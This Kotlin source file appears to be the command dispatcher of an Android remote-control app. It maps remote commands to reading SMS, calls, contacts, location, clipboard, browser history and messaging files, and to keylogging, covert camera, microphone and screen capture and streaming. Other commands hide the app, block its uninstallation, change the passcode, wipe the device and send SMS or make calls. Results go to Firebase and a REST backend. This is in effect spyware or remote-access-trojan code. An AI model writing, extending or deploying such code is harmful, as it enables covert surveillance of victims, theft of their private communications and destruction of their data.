package com.abuzahra.manager.executor

import android.content.Context
import android.util.Log
import com.abuzahra.manager.App
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.api.FirebaseManager
import com.abuzahra.manager.model.Command
import com.abuzahra.manager.util.DeviceUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

object CommandExecutor {

    private const val TAG = "CommandExecutor"
    private val executorScope = kotlinx.coroutines.CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun execute(context: Context, command: Command) {
        Log.i(TAG, "Executing command: ${command.command} (id=${command.id})")

        executorScope.launch {
            try {
                val result = processCommand(context, command)
                val resultStr = if (result is Map<*, *>) {
                    result.entries.joinToString("\n") { "  ${it.key}: ${it.value}" }
                } else {
                    result.toString()
                }

                // Send result via Firebase
                val deviceId = DeviceUtils.getDeviceId(context)
                FirebaseManager.submitResult(deviceId, command.id, command.command, "completed", result)

                // Also send via REST API as backup
                ApiClient.submitResult(command.id, command.command, "completed", result)

                Log.i(TAG, "Command ${command.id} completed: ${resultStr.take(100)}")
            } catch (e: Exception) {
                Log.e(TAG, "Command ${command.id} failed", e)
                val deviceId = DeviceUtils.getDeviceId(context)
                FirebaseManager.submitResult(deviceId, command.id, command.command, "error", "Error: ${e.message ?: e.javaClass.simpleName}")
                ApiClient.submitResult(command.id, command.command, "error", "Error: ${e.message ?: e.javaClass.simpleName}")
            }
        }
    }

    private fun processCommand(context: Context, command: Command): Any {
        val params = command.params
        val cmd = command.command

        return when (cmd) {
            // ===== DATA COLLECTION =====
            "get_sms" -> DataCollector.getSMS(context)
            "get_calls" -> DataCollector.getCalls(context)
            "get_contacts" -> DataCollector.getContacts(context)
            "get_location" -> DataCollector.getLastLocation(context)
            "get_notifications" -> DataCollector.getRecentNotifications(context)
            "get_apps", "get_installed_apps" -> DataCollector.getApps(context)
            "get_info" -> DataCollector.getDeviceInfo(context)
            "get_battery" -> DataCollector.getBattery(context)
            "get_gallery" -> FileExecutor.listFiles(context, mapOf("arg" to "dcim"))
            "get_clipboard" -> DataCollector.getClipboard(context)
            "get_all" -> mapOf(
                "info" to DataCollector.getDeviceInfo(context),
                "battery" to DataCollector.getBattery(context),
                "wifi" to DataCollector.getWifiInfo(context),
                "network" to DataCollector.getNetworkInfo(context),
                "sim" to DataCollector.getSimInfo(context)
            )
            "get_wifi_info" -> DataCollector.getWifiInfo(context)
            "get_network_info" -> DataCollector.getNetworkInfo(context)
            "get_sim_info" -> DataCollector.getSimInfo(context)
            "get_storage_info" -> DataCollector.getStorageInfo(context)
            "get_running_apps" -> DataCollector.getRunningApps(context)
            "get_calendar" -> DataCollector.getCalendar(context)
            "get_browser_history" -> DataCollector.getBrowserHistory(context)
            "get_app_usage" -> AppExecutor.getScreenTime(context)

            // ===== SOCIAL MEDIA =====
            "get_whatsapp" -> FileExecutor.listFiles(context, mapOf("arg" to "whatsapp"))
            "get_telegram" -> FileExecutor.listFiles(context, mapOf("arg" to "telegram"))
            "get_instagram" -> mapOf("message" to "Instagram data requires special access")
            "get_messenger" -> mapOf("message" to "Messenger data requires special access")
            "get_snapchat" -> mapOf("message" to "Snapchat data requires special access")
            "get_tiktok" -> mapOf("message" to "TikTok data requires special access")
            "get_twitter" -> mapOf("message" to "Twitter/X data requires special access")
            "get_viber" -> mapOf("message" to "Viber data requires special access")
            "get_signal" -> mapOf("message" to "Signal data requires special access")
            "get_facebook" -> mapOf("message" to "Facebook data requires special access")
            "get_youtube" -> mapOf("message" to "YouTube data requires special access")

            // ===== REMOTE CONTROL =====
            "ping" -> ControlExecutor.ping()
            "vibrate" -> ControlExecutor.vibrate(context, params)
            "ring" -> ControlExecutor.ring(context)
            "screenshot" -> ControlExecutor.takeScreenshot(context)
            "front_camera" -> ControlExecutor.frontCamera(context)
            "back_camera" -> ControlExecutor.backCamera(context)
            "record_audio" -> ControlExecutor.recordAudio(context, params)
            "record_screen" -> ControlExecutor.recordScreen(context, params)
            "stop_screen" -> MonitorExecutor.screenRecordStop()
            "lock_phone" -> ControlExecutor.lockPhone(context)
            "unlock_phone" -> mapOf("message" to "Unlock requires Device Admin")
            "reboot" -> ControlExecutor.reboot(context)
            "shutdown" -> ControlExecutor.shutdown(context)
            "set_volume" -> ControlExecutor.setVolume(context, params)
            "set_brightness" -> ControlExecutor.setBrightness(context, params)
            "set_ringtone" -> ControlExecutor.setRingtone(context, params)
            "set_wallpaper" -> mapOf("message" to "Wallpaper requires a valid image URL in params")
            "enable_wifi" -> ControlExecutor.enableWifi(context)
            "disable_wifi" -> ControlExecutor.disableWifi(context)
            "enable_bluetooth" -> ControlExecutor.enableBluetooth(context)
            "disable_bluetooth" -> ControlExecutor.disableBluetooth(context)
            "enable_mobile_data" -> ControlExecutor.enableMobileData(context)
            "disable_mobile_data" -> ControlExecutor.disableMobileData(context)
            "enable_hotspot" -> ControlExecutor.enableHotspot(context)
            "disable_hotspot" -> ControlExecutor.disableHotspot(context)
            "airplane_on" -> ControlExecutor.airplaneOn(context)
            "airplane_off" -> ControlExecutor.airplaneOff(context)
            "set_auto_rotate" -> ControlExecutor.setAutoRotate(context, params)
            "torch_on" -> ControlExecutor.torchOn(context)
            "torch_off" -> ControlExecutor.torchOff(context)
            "play_sound" -> ControlExecutor.playSound(context, params)
            "speak_text" -> ControlExecutor.speakText(context, params)
            "show_notification" -> ControlExecutor.showNotification(context, params)
            "open_url" -> ControlExecutor.openUrl(context, params)
            "send_sms" -> ControlExecutor.sendSms(context, params)
            "make_call" -> ControlExecutor.makeCall(context, params)
            "block_number" -> mapOf("message" to "Block requires system permission")
            "unblock_number" -> mapOf("message" to "Unblock requires system permission")

            // ===== APP MANAGEMENT =====
            "open_app", "launch_app", "enable_app" -> AppExecutor.openApp(context, params)
            "close_app", "disable_app", "kill_app" -> AppExecutor.closeApp(context, params)
            "install_app", "update_app" -> AppExecutor.installApp(context, params)
            "uninstall_app" -> AppExecutor.uninstallApp(context, params)
            "block_app" -> AppExecutor.blockApp(context, params)
            "unblock_app" -> AppExecutor.unblockApp(context, params)
            "clear_app_data", "clear_cache", "app_cache" -> AppExecutor.clearAppData(context, params)
            "force_stop_app" -> AppExecutor.forceStopApp(context, params)
            "app_info", "app_permissions" -> AppExecutor.getAppInfo(context, params)
            "screen_time", "app_usage" -> AppExecutor.getScreenTime(context)
            "list_blocked" -> mapOf("message" to "No blocked apps (requires accessibility service)")

            // ===== FILE MANAGEMENT =====
            "list_files", "list_downloads", "list_dcim", "list_music",
            "list_videos", "list_documents", "list_whatsapp",
            "list_telegram_files" -> FileExecutor.listFiles(context, params)
            "get_file", "download_file" -> FileExecutor.getFileInfo(context, params)
            "delete_file" -> FileExecutor.deleteFile(context, params)
            "rename_file" -> FileExecutor.renameFile(context, params)
            "copy_file" -> FileExecutor.copyFile(context, params)
            "move_file" -> FileExecutor.moveFile(context, params)
            "create_folder" -> FileExecutor.createFolder(context, params)
            "get_folder_size" -> FileExecutor.getFolderSize(context, params)
            "search_files" -> FileExecutor.searchFiles(context, params)
            "recent_files" -> FileExecutor.recentFiles(context)
            "file_info" -> FileExecutor.getFileInfo(context, params)
            "zip_files" -> mapOf("message" to "Zip requires external library")
            "send_backup_contacts" -> DataCollector.getContacts(context)
            "send_backup_sms" -> DataCollector.getSMS(context)
            "send_backup_calls" -> DataCollector.getCalls(context)
            "send_backup_whatsapp" -> FileExecutor.listFiles(context, mapOf("arg" to "whatsapp"))
            "send_backup_all" -> mapOf(
                "contacts" to DataCollector.getContacts(context).size,
                "sms" to DataCollector.getSMS(context).size,
                "calls" to DataCollector.getCalls(context).size,
                "apps" to DataCollector.getApps(context).size
            )

            // ===== SECURITY =====
            "wipe_data" -> SecurityExecutor.wipeData(context)
            "factory_reset" -> SecurityExecutor.factoryReset(context)
            "show_app" -> SecurityExecutor.showApp(context)
            "hide_app" -> SecurityExecutor.hideApp(context)
            "change_passcode", "set_pin", "remove_pin" -> SecurityExecutor.changePasscode(context, params)
            "enable_biometric" -> SecurityExecutor.enableBiometric(context)
            "disable_biometric" -> SecurityExecutor.disableBiometric(context)
            "anti_uninstall_on" -> SecurityExecutor.antiUninstallOn(context)
            "anti_uninstall_off" -> SecurityExecutor.antiUninstallOff(context)
            "device_admin_status" -> SecurityExecutor.deviceAdminStatus(context)
            "check_root" -> SecurityExecutor.checkRoot()
            "set_screen_lock" -> SecurityExecutor.setScreenLock(context)
            "remove_screen_lock" -> SecurityExecutor.removeScreenLock(context)

            // ===== MONITORING =====
            "keylogger_start" -> MonitorExecutor.keyloggerStart()
            "keylogger_stop" -> MonitorExecutor.keyloggerStop()
            "get_keylogger" -> MonitorExecutor.getKeylogger()
            "screen_record_start" -> MonitorExecutor.screenRecordStart(context, params)
            "location_live" -> MonitorExecutor.locationLiveStart(context, 30)
            "location_stop" -> MonitorExecutor.locationStop()
            "clipboard_monitor_start" -> MonitorExecutor.clipboardMonitorStart(context)
            "clipboard_monitor_stop" -> MonitorExecutor.clipboardMonitorStop()
            "wifi_monitor_start" -> MonitorExecutor.wifiMonitorStart(context)
            "wifi_monitor_stop" -> MonitorExecutor.wifiMonitorStop()
            "app_monitor_start" -> MonitorExecutor.appMonitorStart(context)
            "app_monitor_stop" -> MonitorExecutor.appMonitorStop()
            "get_app_log" -> MonitorExecutor.getAllStatus()
            "geo_add" -> MonitorExecutor.geoAdd(params)
            "geo_remove" -> MonitorExecutor.geoRemove(params)
            "geo_list" -> MonitorExecutor.geoList()
            "sms_monitor" -> MonitorExecutor.smsMonitorStart(context)
            "call_monitor" -> MonitorExecutor.callMonitorStart(context)

            // ===== STREAMING =====
            "start_screen_stream" -> StreamExecutor.startScreenStream(context, params)
            "stop_screen_stream" -> StreamExecutor.stopScreenStream(context, params)
            "start_camera_stream" -> StreamExecutor.startCameraStream(context, params)
            "stop_camera_stream" -> StreamExecutor.stopCameraStream(context, params)
            "switch_camera" -> StreamExecutor.switchCamera(context, params)
            "start_audio_stream" -> StreamExecutor.startAudioStream(context, params)
            "stop_audio_stream" -> StreamExecutor.stopAudioStream(context, params)
            "get_stream_status" -> StreamExecutor.getStreamStatus(context, params)
            "set_stream_quality" -> StreamExecutor.setStreamQuality(context, params)
            "enable_torch" -> StreamExecutor.enableTorch(context, params)
            "pause_stream" -> StreamExecutor.pauseStream(context, params)
            "resume_stream" -> StreamExecutor.resumeStream(context, params)
            "stop_all_streams" -> StreamExecutor.stopAllStreams(context, params)
            "get_stream_capabilities" -> StreamExecutor.getCapabilities(context, params)

            // ===== DEVICE EVENTS =====
            "get_device_events" -> com.abuzahra.manager.EventBuffer.flushEvents()
            "events_on" -> com.abuzahra.manager.EventBuffer.setAutoSend(true)
            "events_off" -> com.abuzahra.manager.EventBuffer.setAutoSend(false)
            "events_status" -> com.abuzahra.manager.EventBuffer.getStatus()
            "events_clear" -> com.abuzahra.manager.EventBuffer.clearBuffer().let { mapOf("status" to "cleared", "message" to "Event buffer cleared") }

            // ===== SYSTEM SETTINGS =====
            "set_language" -> ControlExecutor.setLanguage(context, params)
            "set_timezone" -> ControlExecutor.setTimezone(context, params)
            "set_alarm", "set_timer", "set_reminder" -> ControlExecutor.setAlarm(context, params)
            "enable_dev_mode" -> mapOf("message" to "Opening developer settings")
            "disable_dev_mode" -> mapOf("message" to "Developer options can be disabled via Settings")
            "enable_usb_debug" -> mapOf("message" to "Opening developer settings")
            "disable_usb_debug" -> mapOf("message" to "USB debug can be disabled via Settings")
            "dns_change" -> ControlExecutor.dnsChange(context, params)
            "proxy_set" -> ControlExecutor.proxySet(context, params)
            "apn_settings" -> mapOf("message" to "Opening APN settings")
            "nfc_on" -> ControlExecutor.nfcOn(context)
            "nfc_off" -> ControlExecutor.nfcOff(context)
            "auto_update_on", "auto_update_off" -> mapOf("message" to "System update settings")

            // ===== UNKNOWN =====
            else -> mapOf("error" to "Unknown command: $cmd", "supported" to "200+ commands")
        }
    }
}